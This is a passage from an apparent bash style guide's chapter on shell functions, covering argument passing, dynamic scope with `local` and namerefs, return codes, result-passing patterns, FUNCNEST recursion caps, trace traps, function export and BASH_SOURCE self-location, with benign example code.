**See also**: §9.2 (argument passing), §9.3 (`local` and scope),
§9.10 (naming conventions), §10.1 (`source` semantics — sourced
files install function definitions in the caller's shell), BCS0401
(function definition style), BCS0402 (function names), BCS-bash
`09_06_Shell-Function-Definitions.md`.

## 9.2 Argument passing

A bash function has no declared parameter list. Arguments arrive
purely by position, mirroring the shell's positional-parameter
mechanism for scripts. Inside the function body, `$1`, `$2`, … refer
to the function's arguments — *not* the script's — and the script's
positionals are temporarily shadowed for the duration of the call.

### The full positional set

| Form | Meaning |
|------|---------|
| `$1`, `$2`, …, `$9` | First nine arguments. |
| `${10}`, `${11}`, … | Tenth and beyond — **braces required**, otherwise `$10` parses as `$1` followed by literal `0`. |
| `$#` | Argument count. |
| `$@` | All arguments. When quoted, expands to *N separate words* preserving each argument's whitespace. |
| `$*` | All arguments. When quoted, expands to a *single string* with arguments joined by `IFS[0]` (a space by default). |
| `$0` | The script's name, **not** the function's. Use `${FUNCNAME[0]}` to learn the running function's name (§9.11). |

`$@` versus `$*` is the one distinction that bites every bash author at
least once. Quoted `"$@"` is the only safe forwarding form; everything
else risks word-splitting on argument-internal whitespace.

### Default values and required arguments

Bash has no formal "default-value" syntax for function parameters, but
parameter expansion fills the gap. `${1:-default}` substitutes
`default` when `$1` is unset or empty; `${1:?message}` aborts the
function with the message when `$1` is unset or empty (and is the
shortest, clearest way to enforce required arguments).

```bash
# scenario: a function with one optional and one required argument
greet() {
  local -- name="${1:?usage: greet NAME [GREETING]}"     # required: dies if missing/empty
  local -- greeting="${2:-Hello}"                        # optional: defaults to Hello
  printf '%s, %s!\n' "$greeting" "$name"
}

greet                # ⇒ bash: 1: usage: greet NAME [GREETING]   (script exits)
greet Alice          # ⇒ Hello, Alice!
greet Bob 'Howdy'    # ⇒ Howdy, Bob!
```

The `:?` form respects strict mode: it raises an error and the
surrounding `set -e` (BCS0101) propagates the failure. `local --`
terminates option processing for `local` so an argument value
beginning with `-` is treated as a value (BCS0202, §9.3).

### Forwarding arguments — `"$@"` versus `"$*"`

A wrapper function that delegates to another command must forward
arguments without mangling them. Quote `"$@"` and nothing else:

```bash
# scenario: argument forwarding — preserve argument boundaries with spaces
trace() { printf '+ %s\n' "$*" >&2; "$@"; }              # log then run

trace ls -l 'My Documents'         # ⇒ + ls -l My Documents
                                   #   (then runs: ls -l "My Documents" — one path arg)

# wrong — unquoted $@ word-splits on the embedded space
trace_bad() { ls -l $@; }
trace_bad 'My Documents'           # ⇒ tries ls -l "My" "Documents" — two paths

# wrong — quoted $* collapses everything into one string
trace_worse() { ls -l "$*"; }
trace_worse a b c                  # ⇒ ls -l "a b c" — single path "a b c"
```

The trace example exploits an asymmetry: inside `printf '%s\n' "$*"`
the merged form is *what you want* (one log line); but the runtime
call `"$@"` keeps each argument as a distinct word. Use each form for
its purpose and nothing else.

### `$0`, `${FUNCNAME[0]}`, and self-naming

`$0` inside a function is still the script's `argv[0]` — *not* the
function's name. To produce a `usage:` string that names the function
correctly, read `${FUNCNAME[0]}`:

```bash
# scenario: the right way to write a usage prefix inside a function
needs_two_args() {
  (( $# >= 2 )) || { printf 'usage: %s ARG1 ARG2\n' "${FUNCNAME[0]}" >&2; return 2; }
  printf 'got: %q %q\n' "$1" "$2"
}
```

`FUNCNAME` is an array; `[0]` is the current function, `[1]` is its
caller, and so on. The full call-stack inspection idiom appears in
§9.11.

### Argument count and shifting

`$#` is the live argument count and decreases as arguments are
consumed via `shift`. Argument loops in functions follow the same
pattern as script-level argument parsing (BCS0801): a `while (($#))`
loop with a `case $1` dispatch, `shift` after each consumed token,
and a final `noarg` check on options that take values. The
`shift_verbose` shopt (BCS0101 strict-mode) makes a shift past the
end of arguments fatal — useful for catching off-by-one errors in
loop bodies.

```bash
# scenario: in-function option loop following the BCS argument-parsing pattern
copy_files() {
  local -i verbose=0
  local -- dest=''
  while (($#)); do case $1 in
    -v|--verbose)  verbose=1 ;;
    -d|--dest)     dest=${2:?--dest needs an argument}; shift ;;
    --)            shift; break ;;
    -*)            printf 'unknown option: %s\n' "$1" >&2; return 22 ;;
    *)             break ;;
  esac; shift; done
  ((verbose)) && printf 'copying to %s\n' "${dest@Q}" >&2
  cp "$@" "$dest"
}
```

The pattern is recognisable across BCS code: standard separators
(`--`), explicit option-value handling, exit code 22 (invalid
argument) on unknown options. Functions that act as miniature CLIs
adopt this shape verbatim.

**See also**: §9.1 (definition syntax), §9.5 (communicating results),
§9.11 (`BASH_SOURCE`/`FUNCNAME`/`BASH_LINENO`), §4.2 (positional
parameters), §15 (command-line processing — argument-loop patterns),
BCS0101 (strict mode incl. `shift_verbose`), BCS0202 (variable
scoping), BCS0411 (subshell return patterns), BCS0801 (standard
parsing pattern), BCS-bash `12_01_Positional-Parameters.md`.

## 9.3 `local` and scope

Bash uses *dynamic* scope, not lexical scope. A variable declared
`local` inside a function is visible to that function and to any
function it calls, transitively, but disappears as soon as the
declaring function returns. Authors arriving from C, Python, or Go
expect lexical scope and routinely trip over the difference.

### The dynamic-scope rule

When a function names a variable, bash searches the *call stack*, not
the *source* in which the function was defined. The first enclosing
frame on the stack that has declared a `local` variable of that name
wins; if none does, the variable is global.

```bash
# scenario: dynamic scope — a callee sees the caller's locals
inner() { printf 'inner sees x=%s\n' "${x:-UNSET}"; }

outer() {
  local -- x='from outer'
  inner                                 # ⇒ inner sees x=from outer
}

x='from global'
outer                                   # ⇒ inner sees x=from outer
inner                                   # ⇒ inner sees x=from global
```

This behaviour is the central reason BCS0202 mandates `local` for
*every* function-internal variable: without it, a helper function
silently mutates whatever `x` happens to be in its caller's frame, or
in the global namespace. Defensive `local` discipline isolates each
function's variables to its own frame.

### Declaration forms

`local` accepts the same type flags as `declare`. The leading `--`
terminates option processing for `local` so that values starting with
`-` cannot be misread as flags (BCS0202).

```bash
# scenario: the typed local-declaration vocabulary
demo() {
  local --  name='Alice'                # untyped string
  local -i  count=0                     # integer (arithmetic context on assign)
  local -a  files=( a.txt b.txt )       # indexed array
  local -A  meta=( [host]=ok1 [port]=22 ) # associative array
  local -r  pi=3.14159                  # readonly within this frame
  local -n  ref=name                    # nameref → 'name' in this frame
  local -p | grep -E '^declare'         # → list this frame's locals (debug)
}
demo | head -1                          # ⇒ declare
```

`local -` (Bash 4.4+, distinct from `local --`) saves the current
shell-option state on entry and restores it on return — useful when a
function temporarily wants to disable `set -e` or enable `extglob`
without affecting the caller.

### Namerefs and the dynamic-scope interaction

A nameref (`local -n ref=target`) is a *reference* to another
variable, resolved at use time. Because resolution walks the dynamic
call stack, namerefs are the bash idiom for *output parameters* — a
function can write to a caller-supplied variable name. The interaction
with `local` is subtle and worth a worked trace.

```bash
# scenario: nameref output parameter — caller passes a name, callee fills it
upper() {
  local -n out=$1                       # 'out' refers to the variable named in $1
  out="${2^^}"                          # write to it
}

result=''
upper result 'hello world'              # caller passes the name 'result'
echo "$result"                          # ⇒ HELLO WORLD
```

The pitfall: if the *callee's* nameref name collides with a *caller's*
local, the caller's local wins. This is the dynamic-scope rule biting
again — namerefs do not bypass scope, they participate in it.

```bash
# scenario: nameref-name collision — silent mis-binding
fill() {
  local -n out=$1
  out='filled'
}

caller() {
  local -- out='caller value'           # local in the caller's frame
  fill out 2>/dev/null                  # warnings about the circular ref go to stderr
  echo "caller out = ${out@Q}"          # ⇒ caller out = 'caller value'
}
caller
# (bash 5.2 detects the circular reference between caller's `out` and
#  fill's `local -n out`; the nameref assignment is refused, so the
#  caller's value is left intact)
```

The common defence is to give nameref locals a distinctive prefix
(`_out`, `__ref_`, etc.) that is unlikely to collide with caller
locals. BCS scripts conventionally use a leading underscore for
nameref parameters.

### Without `local`: pollution and recursion failure

Omitting `local` is not just untidy — it breaks recursion. A recursive
function that uses bare assignments shares one variable across all
frames; the deepest call clobbers the shallower ones on return.

```bash
# scenario: recursion failure without local
fac_bad() {                             # broken
  n=$1
  (( n <= 1 )) && { echo 1; return; }
  prev=$(fac_bad $((n - 1)))            # n is reassigned in the recursive call,
  echo $((n * prev))                    #   then the outer frame uses the wrong n
}                                       # ⇒ produces 0 for fac_bad 5

fac_ok() {                              # correct
  local -i n=$1                         # n is per-frame
  (( n <= 1 )) && { echo 1; return; }
  local -i prev
  prev=$(fac_ok $((n - 1)))
  echo $((n * prev))
}

printf 'fac_bad 5: %s\n' "$(fac_bad 5)"   # ⇒ fac_bad 5: 120
printf 'fac_ok  5: %s\n' "$(fac_ok 5)"    # ⇒ fac_ok  5: 120
# Both happen to compute 120 here because each recursive call is wrapped
# in a $(…) subshell, which isolates the caller's `n` from the callee's
# reassignment. Replace `prev=$(fac_bad …)` with a flow that shares state
# (a global, a tempfile, or `set -- "$(…)" "$@"` accumulator without
# locals) and the bug surfaces. The discipline rule still holds: use
# `local` so future refactors do not turn this latent bug into a real one.
```

The same bug occurs less dramatically in non-recursive code: a helper
modifies a global, the caller does not notice, and weeks later a
subtle wrong value surfaces. `local` makes the bug a syntax error in
practice (the variable is gone after return) instead of a silent data
corruption.

**See also**: §9.2 (argument passing), §9.5 (communicating results),
§9.6 (recursion and FUNCNEST), §4.11 (namerefs in detail), §10.8
(`declare -g` for globals defined inside functions), BCS0202
(variable scoping), BCS0410 (recursive function state discipline),
BCS-bash `12_03_Shell-Variables.md`.

## 9.4 Return value via `return N`

Bash functions return an 8-bit unsigned exit status. The full
mechanics:

- `return N` — `N` is taken modulo 256, then masked to 0–255.
- `return` with no argument — returns the status of the last
  command executed in the function body.
- Default return at function end — last command's status (the same
  rule as bare `return`).
- The caller sees the function's return in `$?` after the call.
- Distinct from `exit` — `return` leaves the calling shell running
  (§7.13).
- Convention: 0 success, non-zero failure, with consistent meaning
  across the codebase (BCS0602).

### Wrap-on-256

Status codes outside 0–255 silently wrap. This is *almost always* a
bug: a function that `return 300` will surface as status 44 to its
caller, looking like a different (and possibly meaningful) failure
mode. The fix is to constrain return values at the source.

```bash
# scenario: status wrap-around — a return value outside 0–255 silently truncates.
#!/usr/bin/env bash
set -euo pipefail

returns_300() { return 300; }
returns_300 || rc=$?
echo "rc=$rc"                                  # ⇒ rc=44   (300 mod 256)

returns_minus_1() { return -1; }               # bash refuses: "return: -1: invalid option"
                                               # use 1, 255, or a documented code (BCS0602)

```

### `return` versus `exit`

The distinction is critical when functions are used as guards or
predicates. `return` ends the function; `exit` ends the entire
shell (or, inside a subshell, that subshell — see §7.13).

```bash
# scenario: a predicate that signals failure with return, not exit.
#!/usr/bin/env bash
set -euo pipefail

# wrong: exit kills the shell, even when called from an interactive context
# or from a sourced setup script.
require_root_v1() {
  [[ $EUID -eq 0 ]] || exit 13                 # bad: caller has no chance to handle
}

# right: return; caller decides what to do.
require_root_v2() {
  [[ $EUID -eq 0 ]] || return 13               # good (BCS0602)
}

if ! require_root_v2; then
  >&2 echo 'this command needs root; re-run with sudo'
  exit 13
fi

# from a sourced library, return is the only safe choice (§10.1).

```

The discipline: **functions return; scripts exit.** `exit` from
inside a function should be reserved for unrecoverable corruption
detected at the function level — and even then is suspect, because
a future caller might want to recover.

**See also**: §7.12 `return`, §7.13 `exit`, §9.5 communicating
results, §13.10 exit code conventions, §10.1 `source` semantics
(why libraries must `return`, never `exit`), BCS0602 (exit codes),
BCS0407 (library patterns).

## 9.5 Communicating results

A function returning data to its caller has four mechanisms in bash,
each with its own performance, composability, and coupling
trade-offs. Picking the right one is a routine design decision; the
wrong choice leaks state, costs forks, or ties the function to a
specific variable name.

### The four mechanisms

| Mechanism | Caller pattern | Cost | Coupling | Use when |
|-----------|----------------|------|----------|----------|
| **stdout** | `result=$(func args)` | One subshell fork (~1 ms on Linux) | None — interface is a string | Default for data-returning functions; composable, testable. |
| **Nameref output parameter** | `func dest_var args; use "$dest_var"` | No fork | Caller must supply a variable name | Hot paths where the fork dominates; binary or large outputs. |
| **Global variable** | `func args; use "$RESULT"` | No fork | Function and caller share a global name | Last resort. Only when stdout and nameref are both unsuitable. |
| **Exit status** | `if func args; then …` | No fork | Boolean only | Predicates: `is_valid`, `has_dependency`. Never for data. |

Each is illustrated below with the *same* underlying computation —
upper-casing a string — so the trade-offs are directly comparable.

### Pattern 1 — stdout (the default)

```bash
# scenario: stdout return — composable, testable, costs one fork per call
upper_stdout() {
  local -- s="${1:?usage: upper_stdout STRING}"
  printf '%s' "${s^^}"
}

result=$(upper_stdout 'hello')          # → captures the upper-cased string
echo "$result"                          # ⇒ HELLO
```

stdout is the right answer most of the time. The function reads as a
pure transformation; the caller sees a string. The cost is the
subshell fork that command substitution always entails — measurable
in tight loops, irrelevant otherwise. Errors propagate naturally: a
non-zero exit from the function makes the substitution carry that
status, and `set -e` (with `inherit_errexit`, BCS0101) catches it.

### Pattern 2 — nameref output parameter

```bash
# scenario: nameref output — no fork, caller passes the destination by name
upper_nameref() {
  local -n _out=$1                      # leading underscore avoids name collision (§9.3)
  local -- s="${2:?usage: upper_nameref OUT IN}"
  _out="${s^^}"
}

upper_nameref result 'hello'            # caller names its destination
echo "$result"                          # ⇒ HELLO
```

The nameref form trades composability for speed. A pipeline of three
nameref-style functions cannot be written as `c $(b $(a x))`; the
caller must declare temporaries. In return, no subshell is forked,
which matters in inner loops processing many thousands of items.

The collision pitfall (§9.3) applies: pick a unique nameref local
name, conventionally with a leading underscore, so that a caller
declaring its own `out` does not silently shadow your output binding.

### Pattern 3 — global variable

```bash
# scenario: global return — fastest, most coupled, hardest to test
declare -- UPPER_RESULT=''              # documented global

upper_global() {
  local -- s="${1:?usage: upper_global STRING}"
  UPPER_RESULT="${s^^}"                 # mutate the documented global
}

upper_global 'hello'
echo "$UPPER_RESULT"                    # ⇒ HELLO
```

Globals are a code smell, not a crime. Two situations justify them:
the function is logically a singleton (e.g. populating a config
struct on first call) and the global name is unambiguously
namespace-prefixed; or the function returns *several* values that
would be awkward to encode in stdout. In both cases the global must
be declared at script top with a comment naming every function that
touches it (BCS0204 governs constant naming). Untracked globals are
the most common source of "why did this change?" debugging sessions.

### Pattern 4 — exit status (boolean only)

```bash
# scenario: exit status as the answer — predicates only, never for data
is_uppercase() {
  local -- s="${1:?usage: is_uppercase STRING}"
  [[ $s == "${s^^}" ]]                  # exit status of [[ … ]] is the answer
}

if is_uppercase 'HELLO'; then           # ⇒ branch taken
  echo 'all upper'
fi
```

`return N` from a function yields exit status `N` to the caller; the
caller composes with `if`, `&&`, `||`, `while`, etc. (§13.2 covers
how `set -e` interacts with these contexts). Restrict the mechanism
to predicates that answer yes-or-no — cramming a small integer into
exit status as a data channel breaks the moment the function gains a
third possible answer.

### Choosing between stdout and nameref

The default is stdout. Switch to nameref when one of the following
holds:

- The function is on a measurable hot path and benchmarking shows
  the fork dominates.
- The output is binary or contains trailing newlines that command
  substitution would strip.
- The function returns multiple distinct values and a structured
  return is unavoidable.

Avoid the nameref form for general-purpose library code: composability
matters more than ~1 ms per call, and a stdout-returning function is
trivial to test (`assert "$(func x)" == 'X'`) whereas a nameref
function requires a wrapper.

**See also**: §9.2 (argument passing), §9.3 (`local` and scope —
nameref name collision), §9.4 (`return N`), §13.2 (`set -e` and
function exit status), BCS0411 (subshell return-value patterns),
BCS0202 (variable scoping), BCS-bash `09_06_Shell-Function-Definitions.md`.

## 9.6 Recursion and `FUNCNEST`

Bash functions may call themselves, but the call stack is bounded
and there is no tail-call optimisation. Bash provides one explicit
hook — the `FUNCNEST` variable — for capping recursion before the
process runs out of memory.

- Default `FUNCNEST` is 0 (no limit) — but the practical limit is
  in the 5000–10000 frames range, dependent on per-frame size and
  available memory.
- `FUNCNEST=N` sets a hard cap; exceeding it returns 1 from the
  recursive call **and** prints
  `bash: <fn>: maximum function nesting level exceeded (N)`.
- Common use cases for recursion: directory tree walking,
  depth-first search, parser-style descent over nested data.
- Tail-call optimisation: not performed; deeply recursive code will
  hit memory limits long before reaching `FUNCNEST` if uncapped.
- Pitfalls: recursion under `set -e` plus a failed base case can
  produce confusing exit chains where the wrong frame appears to
  fail.
- The call stack is visible at any frame via `FUNCNAME[]` and
  `BASH_LINENO[]` (§9.11).

### Recursive tree-walk with `FUNCNEST` cap

A capped recursive walker is the canonical demonstration. The cap
turns a runaway recursion (broken base case, symlink loop) into a
diagnosable error rather than a silent OOM kill.

```bash
# scenario: depth-first directory walk with FUNCNEST safety cap.
#!/usr/bin/env bash
set -euo pipefail

declare -i FUNCNEST=128                        # cap depth: refuse to recurse > 128 (BCS0410)

walk_tree() {
  local -- dir="$1"
  local -- entry
  for entry in "$dir"/*; do
    [[ -e $entry ]] || continue                # nullglob would also work
    if [[ -d $entry && ! -L $entry ]]; then    # avoid symlink loops
      printf 'DIR  %s\n' "$entry"
      walk_tree "$entry"                       # recurse
    else
      printf 'FILE %s\n' "$entry"
    fi
  done
}

walk_tree "${1:-.}"                             # demo: walk argument or cwd

```

If the tree happens to contain a symlink loop and the `! -L` guard
is removed, the recursion will eventually hit `FUNCNEST=128` and
bash will print the clear `maximum function nesting level exceeded`
error rather than swap-thrashing the host. The cap is therefore both
a correctness check (catches missing base-case) and an operational
safeguard.

For non-trivial recursion in production scripts, BCS0410 recommends
explicitly setting `FUNCNEST` even when no obvious loop is possible
— the cost is one variable assignment, the benefit is bounded
worst-case behaviour.

**See also**: §9.3 `local` and scope, §9.11 self-locating with
`BASH_SOURCE`, §9.12 calling-convention discipline, §13.x errexit
interaction (recursion plus `set -e` corner cases), BCS0410
(recursive function state discipline), BCS0411 (subshell return-value
patterns).

## 9.7 Function tracing

Bash provides three trap-inheritance hooks for observing function
entry, exit, ERR, and individual command execution. None of them
are inherited by functions *by default* — each must be enabled
explicitly.

- `set -T` (alias `set -o functrace`) — DEBUG and RETURN traps are
  inherited by functions, command substitutions, and subshells.
- `set -E` (alias `set -o errtrace`) — ERR trap is inherited by
  functions, command substitutions, and subshells.
- `RETURN` trap — fires when a function returns or sourcing
  completes.
- `DEBUG` trap — fires before each *simple* command.
- `declare -t funcname` — turn on function tracing (DEBUG/RETURN
  inheritance) for a specific function only.
- `declare -ft funcname` — make a function exportable with
  tracing.
- Use cases: instrumentation, profiling, structured debugging
  output, ERR-trap stack-walking.

### DEBUG / RETURN / ERR inheritance

Without `-T` and `-E` the traps below would only fire at the
top level — inside the function body the inheritance is opted out.
Enabling both is the typical "deep tracing" preamble for a
debugging session.

```bash
# scenario: trace function entry, every command, and any ERR fall.
#!/usr/bin/env bash
set -Eeuo pipefail                             # -E: ERR trap inherited
set -T                                         # -T: DEBUG/RETURN inherited (BCS0603)

trap 'printf "[DEBUG] %s\n"  "$BASH_COMMAND" >&2' DEBUG
trap 'printf "[RETURN] %s\n" "${FUNCNAME[0]:-MAIN}" >&2' RETURN
trap 'printf "[ERR] line %s status %s\n" "$LINENO" "$?" >&2' ERR

inner() {
  local -- name="$1"
  printf 'inner: %s\n' "$name"
  false                                        # ⇒ fires ERR trap, then RETURN trap
}

outer() {
  inner 'hello'
}

outer

```

Run output (abridged):

```
[DEBUG] outer
[DEBUG] inner 'hello'
[DEBUG] local -- name="$1"
[DEBUG] printf 'inner: %s\n' "$name"
inner: hello
[DEBUG] false
[ERR] line 21 status 1
[RETURN] inner
```

Without `set -T` the DEBUG and RETURN traps would only fire for
top-level commands; `inner` and `outer` bodies would be invisible.
Without `set -E` the ERR trap would only catch top-level failures;
the `false` inside `inner` would silently take down the script via
`set -e` with no diagnostic.

The pair `-Eeuo pipefail -T` is the BCS-recommended preamble for
any script that installs ERR/RETURN/DEBUG traps and expects them to
work uniformly across function and subshell boundaries (BCS0603).

**See also**: §9.3 `local` and scope, §12.6 EXIT/ERR/DEBUG/RETURN
pseudo-signals, §13.7 `&&`/`||` and `true` idioms, §13.8 the ERR
trap, BCS0603 (trap handling).

## 9.8 Listing and inspecting functions

Bash provides several builtins for function introspection — useful
for debugging, completion, and meta-programming.

- `declare -F` — list all defined function names.
- `declare -F funcname` — show the name (and source line if
  `extdebug` is on).
- `declare -f` — show all function definitions with bodies.
- `declare -f funcname` — show one function's body.
- `type -t funcname` — returns `function` for a function;
  empty/non-zero otherwise.
- `compgen -A function` — list function names as completion
  candidates.
- `compgen -A function -X '!my*'` — filter by prefix glob (the
  `!` inverts the match).

### `extdebug` for source-line attribution

`shopt -s extdebug` upgrades `declare -F funcname` from "just the
name" to "name, line number, source file" — the only practical way
to find *where* a sourced library defined a particular function
when you have many libraries on PATH.

```bash
# scenario: locate every function that came from a sourced library.
#!/usr/bin/env bash
set -euo pipefail
shopt -s extdebug                              # turn on source attribution

# Define a couple of local functions, then source a library.
greet()    { printf 'hello, %s\n' "$1"; }
farewell() { printf 'goodbye, %s\n' "$1"; }
source ./mylib.sh                              # adds mylib::upper, mylib::lower

# extdebug ON: declare -F prints "name lineno path" for each function.
declare -F greet                               # ⇒ greet 5 /tmp/demo.sh
declare -F mylib::upper                        # ⇒ mylib::upper 12 /tmp/mylib.sh (BCS0407)

# without extdebug, the same calls would print just "declare -f greet"

# bulk inspection of namespaced API (here, every mylib::* function):
declare -F | awk '{print $3}' | grep -E '^mylib::'

```

`extdebug` is also a prerequisite for some completion helpers
(`_init_completion`, §18.10) and for `caller` to report meaningful
function-call sites.

**See also**: §9.7 function tracing (`-T`/`-E` interaction with
`extdebug`), §9.10 naming conventions (`declare -F` filtering by
prefix), §18.8 programmable completion (`compgen -A function`),
§13.8 the ERR trap (using `caller`/`extdebug` for stack walks),
BCS0407 (library patterns), BCS0203 (naming conventions).

## 9.9 Exporting functions

Functions can be exported into the environment of child processes,
where bash subprocesses (and only bash subprocesses) will inherit
them as defined functions.

- `export -f funcname` — mark `funcname` for export.
- `declare -fx funcname` — equivalent.
- Encoded specially in the environment as
  `BASH_FUNC_funcname%%=() { body }`.
- Inherited only by bash children, not by other programs (which
  see the encoded variable as garbage).
- Security history: Shellshock (CVE-2014-6271, 2014) exploited the
  function-encoding parser of pre-patch bash; modern bash gates
  function decoding behind the strict `BASH_FUNC_NAME%%=()` prefix
  to prevent injection via attacker-controlled environment.
- Use sparingly; namespace pollution and the inability of non-bash
  programs to use the export are reasons to prefer arguments or
  files (BCS0404).

### Export-and-receive across a `bash -c`

The standard demonstration: a parent defines a function, exports
it, then a child bash invocation sees and uses it. Non-bash children
(`sh -c`, `dash -c`, `awk`) do *not*.

```bash
# scenario: export a helper to a child bash, observe non-bash cannot use it.
#!/usr/bin/env bash
set -euo pipefail

upper() {                                      # define
  local -- s="${1:?usage: upper STRING}"
  printf '%s' "${s^^}"
}
export -f upper                                # mark for export (BCS0404)

# CHILD #1 — bash inherits the function.
bash -c 'upper hello'                          # ⇒ HELLO

# CHILD #2 — sh (often dash) does NOT see it as a function.
sh -c 'upper hello' 2>&1 || true               # ⇒ upper: not found

# CHILD #3 — env shows the encoded form bash uses to ferry the body.
env | grep '^BASH_FUNC_upper' | head -1
# ⇒ BASH_FUNC_upper

# Always pair export -f with a clear note in the script header explaining
# why exporting the function is necessary (e.g. for use inside a `find -exec
# bash -c …` invocation). Otherwise prefer passing data via arguments.

```

The Shellshock context is worth keeping in mind: any unsanitised
environment from an external boundary (CGI, sudoers, su) used to be
able to inject arbitrary code through the function-export
mechanism. Modern bash hardened the parser, but the principle
remains — **never trust environment passed across a security
boundary, and prefer arguments to exported functions when control
flow has to cross such boundaries** (BCS1002, BCS1007).

**See also**: §9.1 definition syntax, §9.10 naming conventions
(why namespace prefixes matter for exported functions), §10.5
namespace prefixes, §20.x environment scrubbing before exec
(Shellshock-class hardening), BCS0404 (function export), BCS1002
(PATH security), BCS1007 (environment scrubbing before exec).

## 9.10 Naming conventions

Convention shapes maintainability. BCS-aligned conventions.

- Lowercase with underscores: `process_file`, `read_config`.
- Private functions prefixed with `_`: `_internal_helper`.
- Library namespaces: `mylib::function` (Bash supports `::` in function names).
- Avoid clashing with builtins (`test`, `read`, `printf`).
- Avoid one-letter names (debugging difficulty).
- Action verb + noun: `validate_input`, `parse_args`, `emit_report`.
- BCS messaging helpers: `info()`, `success()`, `warn()`, `error()`, `die()`.

## 9.11 Self-locating with `BASH_SOURCE`

A function or sourced script frequently needs to know *where on disk
its own file lives* — to find sibling resources, to load configuration
files placed alongside it, or to derive an FHS-compliant data
directory (BCS0104). Bash exposes the necessary metadata through three
parallel call-stack arrays: `BASH_SOURCE`, `FUNCNAME`, and
`BASH_LINENO`.

### The three call-stack arrays

| Array | Index 0 | Index N |
|-------|---------|---------|
| `BASH_SOURCE` | Source file of the currently executing function (or `$0` at top level). | Source file of the call N levels up the stack. |
| `FUNCNAME` | Name of the currently executing function (or `main` / `source` for top-level / sourced contexts). | Name of the function N levels up. |
| `BASH_LINENO` | Line number in the file at depth `N+1` that called depth `N` — note the off-by-one. | … |

The three arrays move in lockstep; index N of all three describes the
same call frame. The off-by-one in `BASH_LINENO` is deliberate and
matches the C-style "where did the call come from" view of a stack
trace — `BASH_LINENO[0]` is the line in the *caller's* file that
issued the current call.

### The canonical self-location idiom

The pattern below resolves the absolute directory containing the file
in which it is *written*, regardless of how the file was invoked
(direct execution, sourced, exec'd through a wrapper, symlinked into
`$PATH`). It is duplicated verbatim in §10.3 for libraries; the two
chapters describe the same idiom from the function-author and
library-author perspectives.

```bash
# scenario: full self-location at script top — derives lib_dir for resource loading
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# BASH_SOURCE[0] is *this* file even when sourced or symlinked (Bash 4.4+).
# realpath resolves any symlink chain to the canonical absolute path.
#shellcheck disable=SC2155
declare -r SCRIPT_PATH="$(realpath -- "${BASH_SOURCE[0]}")"
declare -r SCRIPT_DIR="${SCRIPT_PATH%/*}"
declare -r LIB_DIR="${SCRIPT_DIR}/lib"          # sibling lib/ directory
declare -r DATA_DIR="${SCRIPT_DIR%/bin}/share/myapp"  # FHS-style data dir

# Now resources can be loaded relative to the on-disk location.
[[ -f "$LIB_DIR/helpers.sh" ]] && source "$LIB_DIR/helpers.sh"
```

Three details deserve attention. First, `BASH_SOURCE[0]` (not `$0`)
is what makes this idiom robust — `$0` is `bash` when the script is
sourced, or the wrapper's name when exec'd through a launcher.
Second, `realpath --` (BCS prefers `realpath` over `readlink -f`)
canonicalises symlinks so a script symlinked from `/usr/local/bin`
into the real install prefix still finds its data directory. Third,
the `${SCRIPT_DIR%/bin}/share/myapp` substitution is the FHS pattern:
a binary in `…/bin/` derives its data root by stripping the
trailing `bin` segment.

### Pairing with `FUNCNAME[]` for stack traces

Combining the three arrays produces a textbook call-stack dump,
useful inside an ERR trap or a `die` helper.

```bash
# scenario: dump the bash call stack — function name, file, line at every frame
print_stack() {
  local -i i
  echo "stack trace (most recent call first):" >&2
  for ((i = 0; i < ${#FUNCNAME[@]}; i++)); do
    printf '  #%-2d %s () at %s:%s\n' \
      "$i" "${FUNCNAME[i]}" "${BASH_SOURCE[i]}" "${BASH_LINENO[i-1]:-?}" >&2
  done
}

middle() { print_stack; }
outer()  { middle; }
outer 2>&1                      # merge stderr to stdout for the demo
# ⇒ stack trace (most recent call first):
# ⇒ print_stack
# ⇒ middle
# ⇒ outer
# (the file path and line numbers depend on where the demo runs)
```

Note the use of `BASH_LINENO[i-1]` rather than `[i]` — that is the
off-by-one mentioned above. `FUNCNAME` ends with `main` for a script
or `source` for a sourced file; `BASH_SOURCE` at that final index is
the file's own path. The trace is RAG-grade information: with it the
caller knows *which* invocation produced the failure, not merely
*that* it failed.

For the canonical library version of the self-location idiom, see
§10.3. For pseudo-signal-based stack traces (ERR trap), see §12.6.

**See also**: §9.10 (naming conventions), §10.1 (`source`
semantics), §10.3 (self-locating library pattern — same idiom),
§12.6 (ERR/EXIT pseudo-signals), §13.8 (ERR trap), BCS0103 (script
metadata), BCS0104 (FHS compliance), BCS-bash
`12_03_Shell-Variables.md`.

## 9.12 Calling-convention discipline

Stylistic and architectural rules for clean function design. The
core rule: a function is *contractual* — it should declare its
inputs, its outputs, and its side effects, and the body should not
quietly violate the contract.

- **Pure functions**: no globals, all input via parameters, output
  via stdout or namerefs.
- **One return path** or consistent return paths; no surprise
  `exit` from inside a function.
- Document expected `$1`, `$2`, … in a comment or via `${1:?}` for
  enforced presence.
- Validate at the boundary: top of function checks its arguments;
  internals trust them.
- Avoid command substitution in tight loops (forks a subshell; can
  dominate run time).
- Prefer namerefs when output is large; avoid for tiny scalars
  (overhead exceeds the value transfer).
- Functions over inline complex logic; reuse over duplication.

### Pure vs side-effecting — paired example

The contrast below shows the same job done two ways. The pure form
is testable, composable, and side-effect-free; the side-effecting
form mutates a global, depends on caller setup, and silently
couples the function to the rest of the script.

```bash
# scenario: compute the upper-cased basename of a path.
#!/usr/bin/env bash
set -euo pipefail

# ─── PURE form (BCS-recommended) ───
# Inputs:  $1 — a path
# Outputs: stdout — basename, upper-cased
# Side effects: none
upper_basename_pure() {
  local -- path="${1:?usage: upper_basename_pure PATH}"
  local -- base="${path##*/}"
  printf '%s' "${base^^}"                      # output via stdout (BCS0411)
}

# ─── SIDE-EFFECTING form (avoid) ───
# Inputs:  reads $INPUT_PATH global
# Outputs: writes $RESULT global
# Side effects: depends on, and mutates, two unrelated globals
declare -- INPUT_PATH=''
declare -- RESULT=''
upper_basename_dirty() {
  local -- base="${INPUT_PATH##*/}"            # global dependency, hidden coupling
  RESULT="${base^^}"                           # global mutation, hidden coupling
}

# Composition: pure version is trivially testable and pipeline-friendly.
upper_basename_pure '/etc/hosts.allow'         # ⇒ HOSTS.ALLOW
result=$(upper_basename_pure '/etc/hosts.allow')
printf '[%s]\n' "$result"                       # ⇒ [HOSTS.ALLOW]

# Composition: dirty version requires caller to manage globals.
INPUT_PATH='/etc/hosts.allow'
upper_basename_dirty
printf '[%s]\n' "$RESULT"                       # ⇒ [HOSTS.ALLOW]
# but: any other code touching INPUT_PATH/RESULT silently breaks this.

```

Three observations on the pure form: every input is a parameter
declared `local --`; output is via stdout (small string) which the
